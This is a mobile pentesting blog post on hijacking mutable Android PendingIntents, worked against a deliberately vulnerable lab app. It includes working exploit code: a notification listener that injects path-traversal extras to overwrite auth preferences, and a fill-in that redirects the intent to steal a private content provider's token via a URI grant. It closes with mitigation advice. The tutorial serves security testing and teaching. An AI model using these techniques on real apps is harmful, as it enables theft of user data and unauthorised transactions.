---
title: Hijacking a Mutable PendingIntent
author: nirajkharel
date: 2026-05-24 14:30:00 +0800
categories: [Mobile Pentesting, Android]
tags: [Mobile Pentesting, Android, PendingIntent, Notification]
render_with_liquid: false
---


A PendingIntent is a signed blank cheque. The app fills in some details, signs it with its own identity and permissions, and hands it to someone else, the notification system, a widget host, AlarmManager, or another app. When the holder cashes it (`PendingIntent.send()`), Android honours the wrapped Intent **as if the original app fired it** — same UID, same permissions, same access to that app's internal components and content providers. That borrowed identity is the whole bug. If the app left parts of the cheque blank and made it mutable, the holder fills in the blanks and spends the app's identity however they like.

<aside class="lab">
  <p><strong>Vulnerable demo</strong> · <a href="https://github.com/nirajkharel/VulnLabApp">VulnLabApp</a></p>
  <ul>
    <li><code>android/app/src/main/java/com/vulnlab/app/activities/NotificationActivity.java</code> (fixed-base PI on a button; empty-base PI via <code>--ez post_empty_pi true</code>)</li>
    <li><code>android/app/src/main/java/com/vulnlab/app/services/AlarmService.java</code> (AlarmManager-fired mutable PI)</li>
    <li><code>android/app/src/main/java/com/vulnlab/app/providers/SecretProvider.java</code> (private provider, stolen via a leaked URI grant)</li>
  </ul>
</aside>

<br>**Three things decide how bad it is**

1. **Is it mutable?** `FLAG_MUTABLE` (or pre-API-31 default) lets the holder write on the cheque before cashing it — that write is `Intent.fillIn()`.
2. **How blank did the app leave the base intent?** `fillIn()` can only write into fields the base left empty. A base with a fixed component is nearly safe; an empty `new Intent()` is a blank cheque.
3. **Can the attacker get the cheque?** A notification (read via a `NotificationListenerService`), an app widget, a SliceProvider/MediaBrowserService, an AlarmManager entry, or a PendingIntent passed in an extra.

<br>**What fillIn lets the holder change**

`fillIn(other)` merges the holder's intent into the base, field by field. The rule that confuses everyone: a field is copied from the holder **only if the base left it empty** (or the holder sets the matching `FILL_IN_*` flag).

| Field | Can the holder set it? |
|---|---|
| `action`, `data`, `type`, `package`, `categories`, `clipData` | Yes — **if the base left it empty** |
| `component`, `selector` | No — unless the holder passes `FILL_IN_COMPONENT` / `FILL_IN_SELECTOR` |
| extras | Always merged — but the **base wins** on key conflicts |
| `FLAG_GRANT_READ/WRITE_URI_PERMISSION` | Yes — rides along on the fillIn intent |

Two consequences fall straight out of this table, and they are the two tiers of the bug:

- **Base has a fixed component** → the holder can only add *new* extras (extras merge, base wins). Bounded: "make the app do its thing, with my parameters." That is **Tier 1**.
- **Base is empty / implicit** → the holder fills in `action` + `package` to steer the fire to their own component, fills in `data` + a URI grant flag, and walks off with whatever that app can reach. That is **Tier 2**, and it is where the CVEs live.

<br>**Spotting it**

Grep the decompile for `PendingIntent.FLAG_MUTABLE` and the factory calls:

```java
PendingIntent.getActivity(this, 0, intent, PendingIntent.FLAG_MUTABLE | PendingIntent.FLAG_UPDATE_CURRENT);
PendingIntent.getBroadcast(this, 0, intent, PendingIntent.FLAG_MUTABLE);
```

For each, look at the base intent. Is its component set, or is it `new Intent()` / an implicit action? That single fact decides Tier 1 vs Tier 2. Then walk forward: where does the PendingIntent go (notification, widget, extra)?

Frida confirmation, hook the factory to log the flags and whether the base is explicit:

```javascript
Java.perform(function () {
  const PI = Java.use('android.app.PendingIntent');
  PI.getActivity.overload('android.content.Context', 'int', 'android.content.Intent', 'int')
    .implementation = function (ctx, rc, intent, flags) {
      const mutable = (flags & 0x02000000) !== 0;
      const cn = intent.getComponent();
      console.log('[PI.getActivity] mutable=' + mutable + ' target=' + (cn ? cn.flattenToString() : 'implicit'));
      return this.getActivity(ctx, rc, intent, flags);
  };
});
```

`target=implicit` is the Tier-2 tell. Heads-up on the `mutable` boolean: it only checks the explicit `FLAG_MUTABLE` bit. Pre-API-31, PendingIntents are mutable *by default*, so on Android ≤ 11 a PI built without the flag still prints `mutable=false` here yet is fully hijackable. `mutable=false` only rules the bug out from API 31+.

Trigger the surfaces so the PendingIntents get built:

```bash
# Tier 1: fixed-base PI button → tap the "mutable PI" button, or:
adb shell am start -n com.vulnlab.app/.activities.NotificationActivity

# Tier 2: empty-base PI
adb shell am start -n com.vulnlab.app/.activities.NotificationActivity --ez post_empty_pi true

# AlarmManager-fired mutable PI (fires ~60s later)
adb shell am start-service -n com.vulnlab.app/.services.AlarmService
```

<br>**Tier 1 — fixed base intent, inject extras**

VulnLabApp's notification button wraps a *fixed* component, so the base looks like this:

```java
Intent targetIntent = new Intent(this, FileWriteActivity.class);   // component is locked
targetIntent.putExtra("_original_extra", "safe_value");
int piFlags = PendingIntent.FLAG_UPDATE_CURRENT | PendingIntent.FLAG_MUTABLE;
PendingIntent pi = PendingIntent.getActivity(this, 1, targetIntent, piFlags);
// ... attached as a notification's setContentIntent(pi)
```

The component is fixed at `FileWriteActivity`, so the holder can't redirect — but it *can* add extras the base didn't set. Grab the PendingIntent from the notification and fill it in:

```java
public class NotificationHijacker extends NotificationListenerService {
    @Override
    public void onNotificationPosted(StatusBarNotification sbn) {
        if (!sbn.getPackageName().equals("com.vulnlab.app")) return;
        PendingIntent pi = sbn.getNotification().contentIntent;
        if (pi == null) return;
        try {
            // extras merge, base wins on conflicts — you inject NEW keys, not overwrite
            Intent fillIn = new Intent();
            fillIn.putExtra("filename", "../shared_prefs/auth_prefs.xml");
            fillIn.putExtra("content",  "<?xml version='1.0'?><map>"
                + "<boolean name=\"premium\" value=\"true\" /></map>");
            pi.send(this, 0, fillIn);
        } catch (CanceledException ignored) {}
    }
}
```

Register the listener and grant it notification access (it won't fire until access is enabled — this same listener is the acquisition path for Tier 2 too):

```xml
<service
    android:name=".NotificationHijacker"
    android:exported="false"
    android:permission="android.permission.BIND_NOTIFICATION_LISTENER_SERVICE">
    <intent-filter>
        <action android:name="android.service.notification.NotificationListenerService" />
    </intent-filter>
</service>
```

```bash
# Real device: user toggles Settings → Notification access. Test device:
adb shell cmd notification allow_listener \
  com.root3d.myapplication77/com.root3d.myapplication77.NotificationHijacker
```

With access on, fire `NotificationActivity` to post the notification. The listener catches it, adds `filename`/`content` (keys the base never set) and fires the PendingIntent into `FileWriteActivity` — which does the path-traversal write *as VulnLabApp*. Bounded, but real: you made the app overwrite its own `auth_prefs.xml` and flip `premium=true`.

<br>**Tier 2 — empty base intent, redirect and steal a content provider**

This is the dangerous one, and the one all the CVEs (CVE-2020-0188 `SettingsSliceProvider`, CVE-2020-0389 SystemUI `RecordingService`) are instances of. The app builds the PendingIntent from an **empty** base:

```java
// VulnLabApp: --ez post_empty_pi true posts a notification with this
PendingIntent leak = PendingIntent.getActivity(
    this, 2, new Intent(),   // empty base — every field is blank
    PendingIntent.FLAG_UPDATE_CURRENT | PendingIntent.FLAG_MUTABLE);
```

Now the holder controls almost everything. Per the table, they fill in `action` + `package` to steer the fire into their *own* component (they can't set `component` directly, but `package` + `action` resolves there), and `data` + `FLAG_GRANT_READ_URI_PERMISSION` to make the app grant them a URI. Point that URI at a provider the attacker can't reach but the app can — VulnLabApp's private `SecretProvider` (`exported="false"`):

```java
// in the same NotificationListenerService
PendingIntent pi = sbn.getNotification().contentIntent;        // the empty-base PI
Intent fillIn = new Intent("com.attacker.GRANT");              // base action empty → fills
fillIn.setPackage("com.root3d.myapplication77");              // steer the fire to our app
fillIn.setData(Uri.parse("content://com.vulnlab.app.secret/token")); // base data empty → fills
fillIn.addFlags(Intent.FLAG_GRANT_READ_URI_PERMISSION);       // rides along on the fillIn
pi.send(this, 0, fillIn);
```

The fire resolves to your own activity, which receives the intent *with a live read grant* on the private provider:

```java
public class GrantReceiver extends Activity {
    @Override protected void onCreate(Bundle b) {
        super.onCreate(b);
        try {
            Uri u = getIntent().getData();                     // content://com.vulnlab.app.secret/token
            InputStream is = getContentResolver().openInputStream(u);
            // exfil is — the secret token/api_key, from a provider you can't query directly
        } catch (Exception ignored) {}
        finish();
    }
}
```

```xml
<activity android:name=".GrantReceiver" android:exported="true">
    <intent-filter>
        <action android:name="com.attacker.GRANT" />
        <category android:name="android.intent.category.DEFAULT" />
    </intent-filter>
</activity>
```

The key rule (this is what makes it "arbitrary" content provider access): **if VulnLabApp itself couldn't read `content://com.vulnlab.app.secret`, the grant flag would be silently ignored.** It can — it owns the provider — so the read transfers to you, and `grantUriPermissions="true"` makes the grant bypass `exported="false"`. You just read a provider you could never have queried directly. Aim the same trick at a provider the *victim* app's permissions cover (its own private data, or a system provider like contacts/SMS if the app holds the permission) and the impact is whatever that app could read.

<br>**Other reach paths**

The notification listener is the most reachable acquisition today, but the same two tiers apply anywhere the PendingIntent leaks:

- **App widgets.** The launcher (widget host) holds the PendingIntent; a custom launcher / widget host fires it with mutated extras. Seen in home-screen banking widgets with "transfer to last recipient" actions.
- **Cross-app extra.** Some apps pass a callback PendingIntent in an extra ("fire this when you're done"). If the receiver is your app, the leak is direct — mutate and fire.

<br>**What you actually achieve**

- **Tier 1 — identity / action injection.** The internal activity reads `user_id` / `account_id` / `authorize` from the extras. Swap them: IDOR onto another user, or silently complete a queued transaction the user never confirmed. Stale-extra replay is the nasty variant — the base's original nonce stays (base wins), so you keep the real user's nonce and add your own amount fields.
- **Tier 2 — arbitrary content provider read.** Steal data from a private or permission-protected provider using the app's identity. This is the critical-tier outcome, and the one worth chasing on any app with rich notifications.

<br>**Mitigation, and what to look for**

The fix is `FLAG_IMMUTABLE`, plus never building a PendingIntent from an empty/implicit base. Developers don't, because third-party SDKs (analytics, push, ads) demand mutable PendingIntents to inject their own extras at fire time — so grep the SDK `jar`/`aar` files too, not just app code. SDK-side mutable PendingIntents are still the app's bug from a bounty perspective.

Android has been narrowing this: API 31 forced an explicit `FLAG_MUTABLE`/`FLAG_IMMUTABLE` choice, and **API 34 blocks creating a mutable PendingIntent from an implicit base** — which kills Tier 2 at creation for compliant apps targeting 34+. Tier 1 (explicit-component base + mutable) is still allowed and still extras-injectable, and pre-34 apps / unpatched SDKs still ship the empty-base form.

<br>**Closing**

Hold the cheque model and the fillIn table and the rest follows: mutable means writable, an empty base means a blank cheque, and `send()` cashes it with the app's identity. Tier 1 makes the app act with your parameters; Tier 2 makes the app hand you data it alone could reach. The notification-listener path reaches both. Worth checking on every banking or fintech app with rich push notifications.

<br>**References**

- [https://valsamaras.medium.com/pending-intents-a-pentesters-view-92f305960f03](https://valsamaras.medium.com/pending-intents-a-pentesters-view-92f305960f03)
- [https://oversecured.com/blog/gaining-access-to-arbitrary-content-providers](https://oversecured.com/blog/gaining-access-to-arbitrary-content-providers)
- [https://segmentfault.com/a/1190000041532963/en](https://segmentfault.com/a/1190000041532963/en)
- [https://segmentfault.com/a/1190000041550819](https://segmentfault.com/a/1190000041550819)
- [https://hackerone.com/reports/1161401](https://hackerone.com/reports/1161401)

</content>
